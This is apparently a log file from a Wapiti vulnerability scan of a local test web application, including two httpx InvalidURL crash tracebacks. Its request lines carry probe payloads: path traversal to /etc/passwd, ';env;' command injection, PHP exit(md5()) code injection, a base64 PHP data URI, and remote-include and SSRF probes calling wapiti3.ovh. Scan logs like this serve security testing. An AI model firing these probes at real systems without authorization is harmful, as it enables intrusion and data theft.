+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    sec-fetch-user: ?1
+    sec-fetch-site: none
+    sec-fetch-mode: navigate
+    sec-fetch-dest: document
+    upgrade-insecure-requests: 1
+    dnt: 1
+2024-03-21 13:57:27.489 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-21 13:57:27.489 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=fuzz&noptin_ns=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-21 13:57:28.138 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=fuzz&noptin_ns=%2F%2Fopenbugbounty.org%2F
+2024-03-21 13:57:28.794 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 13:57:28.817 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-21 13:57:28.829 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:57:28.849 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-21 13:57:28.862 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:57:29.525 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-21 13:57:29.525 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-21 13:57:29.595 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-21 13:57:29.595 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-21 13:57:29.686 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-21 13:57:29.703 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:57:29.708 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&noptin_ns=email_click (0)
+2024-03-21 13:57:30.353 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&noptin_ns=email_click (0)
+2024-03-21 13:57:31.000 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fpasswd&noptin_ns=email_click (0)
+2024-03-21 13:57:31.645 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fpasswd%00&noptin_ns=email_click (0)
+2024-03-21 13:57:32.290 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fservices&noptin_ns=email_click (0)
+2024-03-21 13:57:32.939 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=%2Fetc%2Fservices%00&noptin_ns=email_click (0)
+2024-03-21 13:57:33.591 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click (0)
+2024-03-21 13:57:34.249 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x7da3923a0900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x7da3923a0860>
+    │       └ <function run at 0x7da3970af560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x7da3925d3240>
+           │      └ <function Runner.run at 0x7da396f36fc0>
+           └ <asyncio.runners.Runner object at 0x7da397a29190>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x7da396f34c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7da397a29190>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x7da396f34b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x7da396f36980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x7da397098e00>
+    └ <Handle <TaskStepMethWrapper object at 0x7da390da7700>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x7da390da7700>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x7da390da7700>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x7da390da7700>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x7da396f5b390 [unset]>
+          │   └ <function Wapiti.attack at 0x7da39240e520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x7da39267f590>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x7da39203ea50>
+          │             │      └ GET http://web/?to=fuzz&noptin_ns=email_click (0)
+          │             └ <function ModuleFile.attack at 0x7da390e6e020>
+          └ <wapitiCore.attack.mod_file.ModuleFile object at 0x7da390e77f10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_file.py", line 166, in attack
+    response = await self.crawler.async_send(mutated_request)
+                     │    │       │          └ GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click (0)
+                     │    │       └ <function AsyncCrawler.async_send at 0x7da395d96020>
+                     │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>
+                     └ <wapitiCore.attack.mod_file.ModuleFile object at 0x7da390e77f10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click (0)
+                     │    └ <function AsyncCrawler.async_get at 0x7da395d96160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>, GET http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc...
+                  └ <function AsyncCrawler.async_get at 0x7da395d960c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7da3962fd1c0>
+                     │    └ <httpx.AsyncClient object at 0x7da392511610>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7da3962fd260>
+                     └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7da3962fd300>
+                     └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')>
+              │    └ <function BaseClient._build_redirect_request at 0x7da3962efc40>
+              └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')>
+          │    └ <function BaseClient._redirect_url at 0x7da3962efd80>
+          └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7da3969ee480>
+          │   │              │       └ URL('http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')
+          │   │              └ <Request('GET', 'http://web/?to=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&noptin_ns=email_click')>
+          │   └ <function URL.copy_with at 0x7da396a0d8a0>
+          └ URL('c:WindowsSystem32driversetcservices')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('c:WindowsSystem32driversetcservices')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7da396a0c400>
+    │                     │   └ ParseResult(scheme='c', userinfo='', host='', port=None, path='WindowsSystem32driversetcservices', query=None, fragment=None)
+    │                     └ URL('c:WindowsSystem32driversetcservices')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'c', 'authority': '', 'path': 'WindowsSystem32driversetcservices', 'query': None, 'fragment': None, 'host': 'web'}
+           └ <function urlparse at 0x7da396a0c220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ 'WindowsSystem32driversetcservices'
+    └ <function validate_path at 0x7da396a0ca40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-21 13:57:34.330 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-21 13:57:34.407 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report f7c277c0-e78a-11ee-8ecb-0242ac160004 ... SUCCESS
+2024-03-21 13:57:34.414 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 13:57:34.438 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-21 13:57:34.456 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 13:57:34.558 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-21 13:57:34.594 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//newsletter-optin-box.json/
+2024-03-21 13:57:34.595 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//newsletter-optin-box.json/web_03212024_1356.html with a browser to see this report.
+2024-03-21 14:38:52.584 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:38:53.393 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/fuzz (1)
+2024-03-21 14:38:53.450 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-21 14:38:53.450 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_2d937a06.db
+2024-03-21 14:38:53.454 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 2 URLs and forms during the scan
+2024-03-21 14:38:53.483 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-21 14:38:53.484 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-21 14:38:53.564 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-21 14:38:53.591 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-21 14:38:53.592 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-21 14:38:53.602 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:38:53.603 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?to=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Ftipj60%2F1%2F746f%2F&noptin_ns=email_click (0)
+2024-03-21 14:38:54.284 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?to=fuzz&noptin_ns=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Ftipj60%2F1%2F6e6f7074696e5f6e73%2F (0)
+2024-03-21 14:38:54.947 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 14:38:54.976 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=tipj60 for results, please wait...
+2024-03-21 14:38:57.214 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-21 14:38:57.229 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 14:38:57.230 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 14:38:57.919 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%7Cenv%7C&noptin_ns=email_click (0)
+2024-03-21 14:38:58.563 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 14:38:59.207 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 14:38:59.849 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&noptin_ns=email_click (0)
+2024-03-21 14:39:00.490 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=fuzz%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 14:39:01.147 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=fuzz%0Aenv%3B&noptin_ns=email_click (0)
+2024-03-21 14:39:01.789 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%26set%26&noptin_ns=email_click (0)
+2024-03-21 14:39:02.443 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=set&noptin_ns=email_click (0)
+2024-03-21 14:39:03.085 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=env&noptin_ns=email_click (0)
+2024-03-21 14:39:03.734 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%2Fe%00&noptin_ns=email_click (0)
+2024-03-21 14:39:04.379 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 14:39:05.028 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 14:39:05.671 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 14:39:06.323 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 14:39:06.973 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 14:39:07.619 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 14:39:08.264 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 14:39:08.907 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 14:39:09.561 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 14:39:10.205 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 14:39:10.852 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 14:39:11.496 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 14:39:12.141 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click (0)
+2024-03-21 14:39:12.785 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x756183184900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x756183184860>
+    │       └ <function run at 0x756187e7b560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x7561833b7240>
+           │      └ <function Runner.run at 0x756187d02fc0>
+           └ <asyncio.runners.Runner object at 0x7561887f1190>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x756187d00c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7561887f1190>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x756187d00b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x756187d02980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x756187e64e00>
+    └ <Handle <TaskStepMethWrapper object at 0x756182c8bc10>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x756182c8bc10>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x756182c8bc10>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x756182c8bc10>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x756187d27650 [unset]>
+          │   └ <function Wapiti.attack at 0x75618313a520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x756183465010>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x756182c9ed50>
+          │             │      └ GET http://web/?to=fuzz&noptin_ns=email_click (0)
+          │             └ <function ModuleExec.attack at 0x756182dac040>
+          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x756182d8bd50>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_exec.py", line 101, in attack
+    response: Response = await self.crawler.async_send(mutated_request)
+    │                          │    │       │          └ GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click (0)
+    │                          │    │       └ <function AsyncCrawler.async_send at 0x756186b4e020>
+    │                          │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>
+    │                          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x756182d8bd50>
+    └ <wapitiCore.net.response.Response object at 0x756182df4490>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click (0)
+                     │    └ <function AsyncCrawler.async_get at 0x756186b4e160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>, GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMX...
+                  └ <function AsyncCrawler.async_get at 0x756186b4e0c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7561870bd1c0>
+                     │    └ <httpx.AsyncClient object at 0x756184e0eb10>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7561830d9ad0>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7561870bd260>
+                     └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7561870bd300>
+                     └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')>
+              │    └ <function BaseClient._build_redirect_request at 0x7561870afc40>
+              └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')>
+          │    └ <function BaseClient._redirect_url at 0x7561870afd80>
+          └ <httpx.AsyncClient object at 0x756184e0eb10>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7561877b23e0>
+          │   │              │       └ URL('http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')
+          │   │              └ <Request('GET', 'http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')>
+          │   └ <function URL.copy_with at 0x7561877d18a0>
+          └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7561877d0400>
+    │                     │   └ ParseResult(scheme='data', userinfo='', host='', port=None, path=';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', quer...
+    │                     └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'data', 'authority': '', 'path': ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', 'query': None, 'fragment'...
+           └ <function urlparse at 0x7561877d0220>
